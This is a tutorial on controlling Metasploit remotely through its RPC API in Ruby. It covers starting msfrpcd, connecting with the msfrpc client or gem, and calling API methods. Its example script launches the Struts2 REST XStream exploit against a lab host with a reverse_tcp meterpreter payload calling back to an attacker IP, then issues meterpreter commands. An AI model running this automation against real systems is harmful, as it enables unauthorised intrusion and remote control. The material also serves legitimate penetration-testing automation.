# Ruby \| Controlling Metasploit Remotely using RPC API in Ruby

While working on something, I wanted to automate exploiting a vulnerability due to the repetitive nature of what I'm working on. There are many solutions that have been followed for a long time, such as execting msfconsole or building a resource\(rc\) file and using msfcli. All these solutions are good, but still not so pragmatical way to deal with Metasploit. It's like using an application as an end-user versus as a developer, so to speak.

So the main idea of this topic is using Metasploit as a service, an RPC service to send commands and receive responses as you are set on the `msfconsole` but you call the RPC service on every command you send or response you receive. This, for example, may allow multiple custom made agents to deal with the same centralized instance and avoiding the need to have Metasploit on your machine.

## Running Metasploit RPC API Server

Basically, there are two main ways to run Metasploit RPC service. The first way, using `msfconsole` command, the second one, using `msfrpcd` command which is the way we are going to use for the rest of the topic as I'm, in this topic, trying to drive you way from `msfconsole` as much as possible.

### Using 'msfconsole' console

Once you run `msfconsole` load the MSGRPC plugin which by default run the server on port `55552` with `msf` as a username and random password.

{% tabs %}
{% tab title="Command" %}
```text
msf > load msgrpc
```
{% endtab %}

{% tab title="Result" %}
```
msf > load msgrpc 
[*] MSGRPC Service:  127.0.0.1:55552 
[*] MSGRPC Username: msf
[*] MSGRPC Password: UN9hlH3w
[*] Successfully loaded plugin: msgrpc
```
{% endtab %}
{% endtabs %}



You can change the default options by assigning its variables as the following

* **ServerHost** - The local hostname that the server listens on.
* **ServerPort** - The local port that the server listens on.
* **User** - The username to access the server.
* **Pass** - The password to access the server. The password must be enclosed in single quotes.
* **SSL** - Enables or disables SSL on the RPC socket. Set this value to true or false.

```text
msf > load msgrpc ServerHost=192.168.1.10 ServerPort=55553 User=cool Pass='looc' SSL=true
```

### Using 'msfrpcd' Command

Metasploit framework comes a utility called `msfrpcd` to run the service.

```text
$ msfrpcd -U <USERNAME> -P <PASSWORD>
```

* `-a <opt>` - The local hostname that the server listens on.
* `-p <opt>` - The local port that the server listens on \(default: 55553\).
* `-U <opt>` - The username to access the server.
* `-P <opt>` - The password to access the server.
* `-S` - Enables or disables SSL on the RPC socket. \(default: true\)
* `-f` - Runs the daemon in the foreground.

```text
$ msfrpcd -U cool -P looc -f
[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...
[*] MSGRPC ready at 2018-11-22 15:40:41 +0300.
```

## Connecting to Metasploit RPC API

### Using 'msfrpc' Client

The fastest way to connect to Metasploit's RPC server is using the framework's client, `msfrpc` utility which comes with metasploit by default if you are using the metasploit nightly build package.

```text
$ msfrpc -h

Usage: msfrpc <options>

OPTIONS:

    -P <opt>  Specify the password to access msfrpcd
    -S        Disable SSL on the RPC socket
    -U <opt>  Specify the username to access msfrpcd
    -a <opt>  Connect to this IP address
    -h        Help banner
    -p <opt>  Connect to the specified port instead of 55553
```

To connect to your server

```text
$ msfrpc -U cool -P looc -a localhost
[*] The 'rpc' object holds the RPC client interface
[*] Use rpc.call('group.command') to make RPC calls
```

This gives you an IRB with `rpc` object that already has a logged-in session.  You can try to see the `rpc` object to make sure you're good to go.

```text
>> rpc
=> #<Msf::RPC::Client:0x00000005029478 @user="cool", @pass="looc", @info={:host=>"localhost", :port=>55553, :uri=>"/api/", :ssl=>true, :ssl_version=>"TLS1.2", :context=>{}}, @token="TEMPQaFDIDmIW7KzWur5Y3DcQ3rOADIz", @cli=#<Rex::Proto::Http::Client:0x00000005029130 @hostname="localhost", @port=55553, @context={}, @ssl=true, @ssl_version="TLS1.2", @proxies=nil, @username="", @password="", @config={"agent"=>"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)", "cgi"=>true, "cookie"=>nil, "data"=>"", "headers"=>nil, "raw_headers"=>"", "method"=>"GET", "path_info"=>"", "port"=>80, "proto"=>"HTTP", "query"=>"", "ssl"=>false, "uri"=>"/", "vars_get"=>{}, "vars_post"=>{}, "version"=>"1.1", "vhost"=>"localhost", "encode_params"=>true, "encode"=>false, "uri_encode_mode"=>"hex-normal", "uri_encode_count"=>1, "uri_full_url"=>false, "pad_method_uri_count"=>1, "pad_uri_version_count"=>1, "pad_method_uri_type"=>"space", "pad_uri_version_type"=>"space", "method_random_valid"=>false, "method_random_invalid"=>false, "method_random_case"=>false, "version_random_valid"=>false, "version_random_invalid"=>false, "uri_dir_self_reference"=>false, "uri_dir_fake_relative"=>false, "uri_use_backslashes"=>false, "pad_fake_headers"=>false, "pad_fake_headers_count"=>16, "pad_get_params"=>false, "pad_get_params_count"=>8, "pad_post_params"=>false, "pad_post_params_count"=>8, "uri_fake_end"=>false, "uri_fake_params_start"=>false, "header_folding"=>false, "chunked_size"=>0, "usentlm2_session"=>true, "use_ntlmv2"=>true, "send_lm"=>true, "send_ntlm"=>true, "SendSPN"=>true, "UseLMKey"=>false, "domain"=>"WORKSTATION", "DigestAuthIIS"=>true, "read_max_data"=>1048576, :vhost=>"localhost", :agent=>"Metasploit RPC Client/1.0", :read_max_data=>536870912}, @config_types={"uri_encode_mode"=>["hex-normal", "hex-all", "hex-random", "u-normal", "u-random", "u-all"], "uri_encode_count"=>"integer", "uri_full_url"=>"bool", "pad_method_uri_count"=>"integer", "pad_uri_version_count"=>"integer", "pad_method_uri_type"=>["space", "tab", "apache"], "pad_uri_version_type"=>["space", "tab", "apache"], "method_random_valid"=>"bool", "method_random_invalid"=>"bool", "method_random_case"=>"bool", "version_random_valid"=>"bool", "version_random_invalid"=>"bool", "uri_dir_self_reference"=>"bool", "uri_dir_fake_relative"=>"bool", "uri_use_backslashes"=>"bool", "pad_fake_headers"=>"bool", "pad_fake_headers_count"=>"integer", "pad_get_params"=>"bool", "pad_get_params_count"=>"integer", "pad_post_params"=>"bool", "pad_post_params_count"=>"integer", "uri_fake_end"=>"bool", "uri_fake_params_start"=>"bool", "header_folding"=>"bool", "chunked_size"=>"integer"}, @pipeline=false, @conn=nil>>
>> 
```

{% hint style="info" %}
**Note:**

Our next code can be executed on the above IRB session too as it's Ruby interpreting the code.
{% endhint %}

### Using 'msfrpc-client' Gem

If you've done all the above, it means you've reached the core topic successfully. Let's get started.

First, we have to install `msfrpc-client` gem.

```text
gem install msfrpc-client
```

Now, let's require the gem. and connect to the server

```ruby
require 'msfrpc-client'

user = 'cool'
pass = 'looc'

opts = {
  host: '127.0.0.1',
  port: 55553,
  uri:  '/api/',
  ssl:  true
}
rpc = Msf::RPC::Client.new(opts)
rpc.login(user, pass)
```

Now, I'm going to show the functionalities/APIs I needed, read the documentation and resources for more.

#### Core : Getting the RPC Service Version

```ruby
rpc.call('core.version')
```

As you can see, always the first argument is the API name that we want to call. Each API may have less or more one arguments.

#### Core : Getting the Module Stats

Number of exploits, auxiliary, post, encoders, nops, payloads modules

```ruby
rpc.call('core.module_stats')
```

#### Module : Show an Exploit Module

Exactly like using msfconsole:  `info exploit/multi/http/struts2_rest_xstream`

```ruby
rpc.call('module.options', 'exploit', 'multi/http/struts2_rest_xstream')
```

#### Module : Setting Options and Executing the Module

Exactly like saying `set RHOST 192.168.100.62` and `set payload linux/x86/meterpreter/reverse_tcp` and other options then `exploit`.

```ruby
exp_opts = {
  'RHOST'     => '192.168.100.62',
  'RPORT'     => 80,
  'TARGETURI' => '/orders/3',
  'SSL'       => false,
  'SRVHOST'   => '0.0.0.0',
  'SRVPORT'   => 8081,
  'UserAgent' => 'Black Hat Ruby',
  'target'    => 4 # 'Linux (Dropper)'
}
pay_opts = {
  'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
  'LHOST'   => '192.168.100.10',
  'LPORT'   => 9911
}
job = rpc.call('module.execute', 'exploit', 'multi/http/struts2_rest_xstream', exp_opts.merge(pay_opts))
```

This will return the job id if the exploit works.

#### Session : Getting Information about Job

It takes the session id, we know it from the previous request.

```ruby
rpc.call('job.info', 7)
```

#### Session : List Available Sessions

```ruby
rpc.call('session.list')
```

#### Session : Executing Meterpreter commands

```ruby
rpc.call('session.meterpreter_write', 10, "sysinfo")
```

#### Session : Reading Meterpreter command response

```ruby
rpc.call('session.meterpreter_write', 10, "sysinfo")
```

### Full Code

```ruby
#!/usr/bin/env ruby
# Author:
#   Sabri | @KINGSABRI
# Description:
#   How to use MSFRPC API
# Requirements:
#   gem install msfrpc-client
#
require 'msfrpc-client'

user = 'cool'
pass = 'looc'

opts = {
  host: '127.0.0.1',
  port: 55553,
  uri:  '/api/',
  ssl:  true
}
rpc = Msf::RPC::Client.new(opts)
rpc.login(user, pass)
rpc.call('core.version')
rpc.call('core.module_stats')
rpc.call('module.info', 'exploit', 'multi/http/struts2_rest_xstream')
rpc.call('module.options', 'exploit', 'multi/http/struts2_rest_xstream')
# Executes a module.
exp_opts = {
  'RHOST'     => '192.168.100.62',
  'RPORT'     => 80,
  'TARGETURI' => '/orders/3',
  'SSL'       => false,
  'SRVHOST'   => '0.0.0.0',
  'SRVPORT'   => 8081,
  'UserAgent' => 'Black Hat Ruby',
  'target'    => 4 # 'Linux (Dropper)'
}
pay_opts = {
  'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
  'LHOST'   => '192.168.100.10',
  'LPORT'   => 9911
}
job = rpc.call('module.execute', 'exploit', 'multi/http/struts2_rest_xstream', exp_opts.merge(pay_opts))
rpc.call('job.list')
rpc.call('job.info', 7)
rpc.call('session.list')
rpc.call('session.meterpreter_write', 10, "sysinfo")
rpc.call('session.meterpreter_read', 10)
```

Finally, I really find this as an awesome way to use Metasploit in ways you are never thought it would be that easy in your code. I'll leave the rest to your imagination.

## **Resources**

* [Running Metasploit Remotely](https://metasploit.help.rapid7.com/docs/running-metasploit-remotely)
* [RPC API](https://metasploit.help.rapid7.com/docs/rpc-api)
* [MSF RPC Code](https://github.com/rapid7/metasploit-framework/tree/master/lib/msf/core/rpc/v10)

